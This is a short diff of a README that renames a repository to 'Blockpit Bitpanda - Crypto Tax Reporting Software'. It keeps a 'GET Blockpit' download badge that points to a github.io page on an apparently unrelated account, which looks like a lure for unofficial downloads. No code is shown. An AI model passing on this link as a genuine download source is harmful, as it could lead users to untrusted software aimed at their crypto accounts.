@@ -1,4 +1,4 @@
-# Blockpit - Crypto Tax Reporting Software
+# Blockpit Bitpanda - Crypto Tax Reporting Software
 
 [![GET Blockpit](https://img.shields.io/badge/GET%20%E2%80%94%20Blockpit-0078D6?style=for-the-badge&logoColor=white)](https://benrileytfop.github.io/.github/blockpit-bitpanda)
 
